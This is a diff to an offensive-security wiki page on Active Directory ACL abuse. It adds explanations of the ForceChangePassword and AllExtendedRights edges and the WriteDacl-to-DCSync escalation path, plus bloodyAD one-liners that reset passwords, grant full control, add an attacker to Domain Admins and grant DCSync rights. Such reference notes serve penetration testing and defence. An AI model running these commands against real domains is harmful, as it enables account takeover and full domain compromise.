@@ -40,6 +40,22 @@ Write access to specific attributes, most commonly targeted:
 - `msDS-KeyCredentialLink` → [[shadow-credentials]] (passwordless takeover + NT hash recovery)
 - GPO objects (`GenericWrite`/`WriteDacl`/`WriteOwner`) → [[gpo-abuse]]
 
+### ForceChangePassword (User-Force-Change-Password)
+An **extended right** (distinct from `GenericAll`) that lets the holder **reset
+the target user's password without knowing the old one** — nothing else. It's
+the narrowest "own this user" edge (BloodHound `ForceChangePassword`). Loud
+(locks the real user out), so prefer a targeted SPN write + [[kerberoasting]] or
+[[shadow-credentials]] when the edge allows it.
+
+### AllExtendedRights (and the DCSync grant)
+`AllExtendedRights` bundles every extended right on the object, which on
+different targets means: **ForceChangePassword** (user), **read the LAPS
+password** ([[laps]]) / **read the gMSA managed password** ([[gmsadumper]]),
+and — crucially, on the **domain head** — the **DS-Replication-Get-Changes /
+Get-Changes-All** rights that *are* [[dcsync]]. So the highest-value ACL chain is
+**`WriteDacl` (or `WriteOwner`→`WriteDacl`) on the domain object → grant yourself
+the replication ACEs → DCSync the domain**. That path: [[path-genericwrite-to-dcsync]].
+
 ## Commands
 
 ```powershell
@@ -76,6 +92,17 @@ owneredit.py -action write -new-owner attacker -target TargetObject 'DOMAIN/atta
 
 # Grant self full control via the ACL
 dacledit.py -action write -rights FullControl -principal attacker -target TargetObject 'DOMAIN/attacker:password'
+```
+
+```bash
+# --- bloodyAD: the same edges as one-liners from Linux (see [[bloodyad]]) ---
+bloodyAD --host dc01 -d corp.local -u attacker -p pass get writable   # which edges do I hold?
+bloodyAD ... set owner TargetObject attacker         # WriteOwner
+bloodyAD ... add genericAll TargetObject attacker    # WriteDacl -> full control
+bloodyAD ... set password targetuser 'Newpass1!'     # GenericAll / ForceChangePassword
+bloodyAD ... add groupMember 'Domain Admins' attacker
+bloodyAD ... add dcsync attacker                     # WriteDacl on domain head -> [[dcsync]]
+# ...then `remove` each on the way out (add groupMember -> remove groupMember, etc.)
 ```
 
 ```powershell
@@ -139,7 +166,10 @@ Whisker.exe add /target:TargetObject
   own the box" GenericWrite/GenericAll abuse
 - [[ad-cs-esc-attacks]] — ESC4 is WriteDacl/WriteOwner/WriteProperty over a
   certificate template, the AD CS-specific case of this same primitive
-- [[kerberoasting]] — targeted kerberoasting via SPN write
+- [[kerberoasting]] — targeted kerberoasting via SPN write; [[targeted-roasting]] for the full set→roast→revert loop
+- [[dcsync]] — the payoff of `WriteDacl`/`AllExtendedRights` on the domain head
+- [[shadow-credentials]] — `msDS-KeyCredentialLink` write → cert → NT hash
+- [[bloodyad]] — the Linux one-tool interface for all of these writes (`get writable`, `add dcsync`, …)
 - [[ad-tiering-and-hardening]] — primary structural mitigation
 - [[powerupack]] — PowerShell toolkit that exploits these ACL edges
 
